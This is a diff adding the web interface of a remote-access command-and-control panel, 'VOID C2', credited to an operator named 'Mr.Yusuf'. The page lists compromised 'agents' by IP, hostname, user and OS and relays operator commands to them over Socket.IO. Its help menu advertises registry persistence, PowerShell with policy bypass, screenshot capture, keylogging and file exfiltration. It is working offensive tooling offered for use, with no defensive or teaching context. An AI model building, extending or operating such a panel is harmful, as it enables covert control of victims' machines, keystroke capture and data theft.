@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VOID C2 | Mr.Yusuf</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <style>
+        :root {
+            --g: #00ff41;
+            --g2: #00cc33;
+            --g3: #009922;
+            --gdim: rgba(0,255,65,0.15);
+            --gborder: rgba(0,255,65,0.4);
+            --bg: #000000;
+            --bg2: #020d02;
+            --bg3: #041004;
+            --red: #ff3333;
+            --yellow: #ffcc00;
+        }
+
+        * { margin:0; padding:0; box-sizing:border-box; }
+
+        body {
+            background: var(--bg);
+            color: var(--g);
+            font-family: 'Share Tech Mono', monospace;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Matrix canvas */
+        #matrix-bg {
+            position: fixed; top:0; left:0;
+            z-index: 0; opacity: 0.07;
+            pointer-events: none;
+        }
+
+        /* ======= LAYOUT ======= */
+        .main-wrap {
+            display: flex;
+            height: 100vh;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ======= LEFT SIDEBAR ======= */
+        .sidebar {
+            width: 320px;
+            min-width: 320px;
+            background: var(--bg2);
+            border-right: 1px solid var(--gborder);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        /* Logo block */
+        .logo-block {
+            padding: 22px 20px 18px;
+            border-bottom: 1px solid var(--gborder);
+            text-align: center;
+            background: var(--bg3);
+        }
+
+        .logo-diamonds {
+            display: flex; align-items: center; justify-content: center;
+            gap: 10px; margin-bottom: 4px;
+        }
+
+        .diamond {
+            width: 10px; height: 10px;
+            background: var(--g);
+            transform: rotate(45deg);
+            box-shadow: 0 0 8px var(--g);
+        }
+
+        .logo-title {
+            font-family: 'VT323', monospace;
+            font-size: 2.8rem;
+            letter-spacing: 12px;
+            color: var(--g);
+            text-shadow: 0 0 20px var(--g), 0 0 40px var(--g2);
+            line-height: 1;
+        }
+
+        .logo-sub {
+            font-size: 0.62rem;
+            letter-spacing: 4px;
+            color: var(--g3);
+            margin-top: 4px;
+        }
+
+        /* Operator block */
+        .operator-block {
+            padding: 14px 20px;
+            border-bottom: 1px solid var(--gborder);
+            text-align: center;
+            background: linear-gradient(180deg, rgba(0,255,65,0.05), transparent);
+        }
+
+        .op-label {
+            font-size: 0.62rem; letter-spacing: 3px; color: var(--g3);
+            border: 1px solid var(--gborder);
+            display: inline-block; padding: 2px 10px; margin-bottom: 6px;
+        }
+
+        .op-name {
+            font-family: 'VT323', monospace;
+            font-size: 1.6rem;
+            color: var(--g);
+            text-shadow: 0 0 15px var(--g);
+            letter-spacing: 2px;
+        }
+
+        /* Network status */
+        .netstatus-block {
+            padding: 14px 20px;
+            border-bottom: 1px solid var(--gborder);
+        }
+
+        .section-title {
+            font-size: 0.62rem; letter-spacing: 3px; color: var(--g3);
+            text-align: center; margin-bottom: 12px;
+        }
+
+        .stats-row {
+            display: flex; gap: 8px;
+        }
+
+        .stat-box {
+            flex: 1;
+            border: 1px solid var(--gborder);
+            text-align: center;
+            padding: 10px 5px;
+            background: var(--bg3);
+        }
+
+        .stat-box .stat-label {
+            font-size: 0.55rem; letter-spacing: 2px; color: var(--g3); display: block; margin-bottom: 6px;
+        }
+
+        .stat-box .stat-val {
+            font-family: 'VT323', monospace;
+            font-size: 2.2rem; line-height: 1;
+            color: var(--g);
+            text-shadow: 0 0 15px var(--g);
+        }
+
+        .stat-box.dead .stat-val { color: var(--red); text-shadow: 0 0 15px var(--red); border-color: var(--red); }
+        .stat-box.dead { border-color: rgba(255,51,51,0.4); }
+
+        /* Agent list */
+        .agent-list-header {
+            padding: 10px 20px 6px;
+            font-size: 0.62rem; letter-spacing: 3px; color: var(--g3);
+        }
+
+        .agent-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0 12px 12px;
+        }
+
+        .agent-list::-webkit-scrollbar { width: 3px; }
+        .agent-list::-webkit-scrollbar-thumb { background: var(--g3); }
+
+        .agent-card {
+            border: 1px solid var(--gborder);
+            padding: 12px 14px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            background: var(--bg3);
+            transition: all 0.2s;
+            position: relative;
+        }
+
+        .agent-card:hover { border-color: var(--g); background: rgba(0,255,65,0.08); }
+        .agent-card.active { border-color: var(--g); background: rgba(0,255,65,0.12); }
+
+        .agent-card-top {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .agent-ip {
+            font-family: 'VT323', monospace;
+            font-size: 1.1rem; color: var(--g);
+            text-shadow: 0 0 8px var(--g);
+        }
+
+        .badge {
+            font-size: 0.55rem; letter-spacing: 2px;
+            padding: 2px 8px;
+            border: 1px solid var(--g);
+            color: var(--g);
+        }
+
+        .badge.dead { border-color: var(--red); color: var(--red); }
+
+        .agent-info { font-size: 0.65rem; color: var(--g3); line-height: 1.7; }
+        .agent-info span { color: var(--g2); }
+
+        /* ======= RIGHT PANEL ======= */
+        .right-panel {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background: var(--bg);
+            overflow: hidden;
+        }
+
+        /* Shell header */
+        .shell-header {
+            padding: 12px 24px;
+            border-bottom: 1px solid var(--gborder);
+            display: flex; align-items: center; justify-content: space-between;
+            background: var(--bg2);
+        }
+
+        .shell-title {
+            font-size: 0.75rem; letter-spacing: 4px; color: var(--g);
+        }
+
+        .traffic-lights { display: flex; gap: 8px; }
+        .tl { width: 13px; height: 13px; border-radius: 50%; }
+        .tl.r { background: var(--red); box-shadow: 0 0 6px var(--red); }
+        .tl.y { background: var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+        .tl.g { background: var(--g); box-shadow: 0 0 6px var(--g); }
+
+        /* Shell output */
+        #shell-output {
+            flex: 1;
+            overflow-y: auto;
+            padding: 30px 40px;
+            scroll-behavior: smooth;
+            position: relative;
+        }
+
+        #shell-output::-webkit-scrollbar { width: 3px; }
+        #shell-output::-webkit-scrollbar-thumb { background: var(--g3); }
+
+        .shell-placeholder {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: var(--g3);
+            font-size: 0.85rem; letter-spacing: 3px;
+            pointer-events: none;
+        }
+
+        .shell-placeholder::before {
+            content: '(';
+            margin-right: 8px;
+        }
+        .shell-placeholder::after {
+            content: ')';
+            margin-left: 8px;
+        }
+
+        /* Log lines */
+        .log-line { margin-bottom: 6px; font-size: 0.82rem; line-height: 1.6; }
+        .log-label { color: var(--g3); margin-right: 8px; }
+        .log-cmd { color: var(--g); font-weight: bold; }
+        .log-result {
+            background: rgba(0,255,65,0.04);
+            border-left: 2px solid var(--g3);
+            padding: 8px 14px;
+            margin-top: 4px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: var(--g2);
+            font-size: 0.8rem;
+        }
+        .log-sys { color: var(--g3); }
+        .log-err { color: var(--red); }
+
+        /* Blinking cursor */
+        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+        .cursor {
+            display: inline-block;
+            width: 8px; height: 14px;
+            background: var(--g);
+            animation: blink 1s infinite;
+            vertical-align: middle;
+            margin-left: 2px;
+        }
+
+        /* Command input bar */
+        .cmd-bar {
+            padding: 0 24px;
+            height: 58px;
+            border-top: 1px solid var(--gborder);
+            display: flex; align-items: center; gap: 16px;
+            background: var(--bg2);
+        }
+
+        .cmd-prompt {
+            font-size: 1rem; color: var(--g);
+            text-shadow: 0 0 8px var(--g);
+            flex-shrink: 0;
+        }
+
+        #core-input {
+            flex: 1;
+            background: transparent; border: none; outline: none;
+            color: var(--g);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+        }
+
+        #core-input::placeholder { color: var(--g3); }
+
+        .server-status {
+            display: flex; align-items: center; gap: 8px;
+            border: 1px solid var(--gborder);
+            padding: 6px 14px;
+            font-size: 0.6rem; letter-spacing: 2px; color: var(--g);
+            flex-shrink: 0;
+            background: rgba(0,255,65,0.05);
+        }
+
+        .status-dot {
+            width: 7px; height: 7px; border-radius: 50%;
+            background: var(--g);
+            box-shadow: 0 0 8px var(--g);
+            animation: blink 2s infinite;
+        }
+
+        /* Loading dots */
+        @keyframes dots {
+            0%,20%{content:'.'} 40%{content:'..'} 60%{content:'...'} 80%,100%{content:''}
+        }
+        .loading::after { content:'.'; animation: dots 1.2s infinite; }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix-bg"></canvas>
+
+<div class="main-wrap">
+
+    <!-- ===== SIDEBAR ===== -->
+    <div class="sidebar">
+
+        <div class="logo-block">
+            <div class="logo-diamonds">
+                <div class="diamond"></div>
+                <div class="logo-title">VOID C2</div>
+                <div class="diamond"></div>
+            </div>
+            <div class="logo-sub">COMMAND &amp; CONTROL FRAMEWORK</div>
+        </div>
+
+        <div class="operator-block">
+            <div class="op-label">( ( OPERATOR ) )</div>
+            <div class="op-name">Mr.Yusuf</div>
+        </div>
+
+        <div class="netstatus-block">
+            <div class="section-title">( ( NETWORK STATUS ) )</div>
+            <div class="stats-row">
+                <div class="stat-box">
+                    <span class="stat-label">ACTIVE</span>
+                    <div class="stat-val" id="cnt-active">0</div>
+                </div>
+                <div class="stat-box dead">
+                    <span class="stat-label">DEAD</span>
+                    <div class="stat-val" id="cnt-dead">0</div>
+                </div>
+                <div class="stat-box">
+                    <span class="stat-label">TOTAL</span>
+                    <div class="stat-val" id="cnt-total">0</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="agent-list-header">( ( CONNECTED AGENTS ) )</div>
+        <div class="agent-list" id="agent-repo">
+            <!-- populated by JS -->
+        </div>
+
+    </div>
+
+    <!-- ===== RIGHT PANEL ===== -->
+    <div class="right-panel">
+
+        <div class="shell-header">
+            <div class="shell-title">( ( REMOTE SHELL INTERFACE ) )</div>
+            <div class="traffic-lights">
+                <div class="tl r"></div>
+                <div class="tl y"></div>
+                <div class="tl g"></div>
+            </div>
+        </div>
+
+        <div id="shell-output">
+            <div class="shell-placeholder" id="placeholder">
+                SELECT AGENT TO ESTABLISH CONNECTION
+            </div>
+        </div>
+
+        <div class="cmd-bar">
+            <div class="cmd-prompt">&gt;</div>
+            <input type="text" id="core-input" placeholder="ENTER COMMAND..." autocomplete="off" autofocus>
+            <div class="server-status">
+                <div class="status-dot"></div>
+                C2 SERVER ONLINE
+            </div>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+    // ======== Matrix rain ========
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 18);
+    const drops = Array(cols).fill(1);
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()_+-=[]{}|;:,.<>?";
+    function drawMatrix() {
+        ctx.fillStyle = 'rgba(0,0,0,0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#00ff41';
+        ctx.font = '14px Share Tech Mono';
+        drops.forEach((y, i) => {
+            const ch = chars[Math.floor(Math.random() * chars.length)];
+            ctx.fillText(ch, i * 18, y * 18);
+            if (y * 18 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(drawMatrix, 45);
+
+    // ======== Socket.IO ========
+    const socket = io();
+    let targetId = null;
+    let cmdHistory = [];
+    let histIdx = -1;
+
+    const out = document.getElementById('shell-output');
+    const input = document.getElementById('core-input');
+    const placeholder = document.getElementById('placeholder');
+
+    // ======== Agent list ========
+    socket.on('agent_list', (agents) => {
+        const active = agents.filter(a => a.status === 'Active');
+        const dead   = agents.filter(a => a.status !== 'Active');
+        document.getElementById('cnt-active').textContent = active.length;
+        document.getElementById('cnt-dead').textContent   = dead.length;
+        document.getElementById('cnt-total').textContent  = agents.length;
+
+        const repo = document.getElementById('agent-repo');
+        repo.innerHTML = '';
+        agents.forEach(a => {
+            const d = document.createElement('div');
+            d.className = 'agent-card' + (a.id === targetId ? ' active' : '');
+            d.onclick = () => activateNode(a);
+            d.innerHTML = `
+                <div class="agent-card-top">
+                    <div class="agent-ip">${a.id.split(':')[0]}</div>
+                    <div class="badge ${a.status === 'Active' ? '' : 'dead'}">${a.status === 'Active' ? 'ACTIVE' : 'DEAD'}</div>
+                </div>
+                <div class="agent-info">
+                    HOST: <span>${a.hostname}</span><br>
+                    USER: <span>${a.username}</span><br>
+                    OS:   <span>${a.os}</span><br>
+                    PWD:  <span style="font-size:0.6rem">${a.cwd || '/'}</span>
+                </div>`;
+            repo.appendChild(d);
+        });
+    });
+
+    // ======== Activate node ========
+    function activateNode(a) {
+        targetId = a.id;
+        placeholder.style.display = 'none';
+        out.innerHTML = '';
+        addLine('sys', `SECURE CHANNEL OPENED :: ${a.hostname}`);
+        addLine('sys', `REMOTE: ${a.id} | USER: ${a.username} | OS: ${a.os}`);
+        addLine('sys', `TYPE 'help' FOR COMMAND PROTOCOL`);
+        document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('active'));
+        event.currentTarget.classList.add('active');
+        input.focus();
+    }
+
+    // ======== Output helpers ========
+    function addLine(type, text) {
+        const d = document.createElement('div');
+        d.className = 'log-line';
+        if (type === 'sys')    d.innerHTML = `<span class="log-sys">[SYS] ${escHtml(text)}</span>`;
+        else if (type === 'err') d.innerHTML = `<span class="log-err">[ERR] ${escHtml(text)}</span>`;
+        else if (type === 'cmd') d.innerHTML = `<span class="log-label">&gt;</span><span class="log-cmd">${escHtml(text)}</span>`;
+        else if (type === 'res') {
+            const b = document.createElement('div');
+            b.className = 'log-result';
+            b.textContent = text;
+            d.appendChild(b);
+        }
+        out.appendChild(d);
+        out.scrollTop = out.scrollHeight;
+        return d;
+    }
+
+    function escHtml(t) {
+        return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    // ======== Command input ========
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') {
+            const cmd = input.value.trim();
+            if (!cmd) return;
+            input.value = '';
+
+            // local commands
+            if (cmd.toLowerCase() === 'clear') { out.innerHTML = ''; return; }
+
+            if (cmd.toLowerCase() === 'history') {
+                addLine('sys', 'COMMAND HISTORY:');
+                cmdHistory.forEach((h, i) => addLine('sys', `[${i+1}] ${h}`));
+                return;
+            }
+
+            if (cmd.toLowerCase() === 'help') {
+                const helpLines = [
+                    'COMMAND PROTOCOL :: VOID C2 v2.5',
+                    '─────────────────────────────────',
+                    'sysinfo       → Remote host telemetry',
+                    'persist       → Registry-based persistence',
+                    'ps [cmd]      → PowerShell with bypass',
+                    'cd [path]     → Traverse file system',
+                    'screenshot    → Capture remote screen',
+                    'keylog start  → Begin keylogger',
+                    'keylog dump   → Dump keylog data',
+                    'download [f]  → Exfiltrate file',
+                    'clear         → Purge terminal buffer',
+                    'history       → Session command log',
+                    'exit          → Terminate session',
+                ];
+                helpLines.forEach(l => addLine('res', l));
+                return;
+            }
+
+            if (!targetId) {
+                addLine('err', 'NO AGENT SELECTED — SELECT TARGET FROM LEFT PANEL');
+                return;
+            }
+
+            cmdHistory.unshift(cmd);
+            histIdx = -1;
+            addLine('cmd', cmd);
+
+            const loadEl = document.createElement('div');
+            loadEl.className = 'log-line log-sys loading';
+            loadEl.textContent = 'Executing';
+            out.appendChild(loadEl);
+            out.scrollTop = out.scrollHeight;
+
+            const cbId = 'cb-' + Date.now();
+            socket.emit('execute_command', { agent_id: targetId, command: cmd, callback_id: cbId });
+            loadEl.dataset.cbid = cbId;
+
+        } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (histIdx < cmdHistory.length - 1) input.value = cmdHistory[++histIdx];
+        } else if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            histIdx > 0 ? input.value = cmdHistory[--histIdx] : (histIdx = -1, input.value = '');
+        }
+    });
+
+    socket.on('command_result', (data) => {
+        // remove loader
+        document.querySelectorAll('.loading').forEach(el => {
+            if (el.dataset.cbid === data.callback_id) el.remove();
+        });
+        if (data.agent_id !== targetId) return;
+        addLine('res', data.result);
+    });
+
+    document.body.addEventListener('click', () => input.focus());
+</script>
+</body>
+</html>
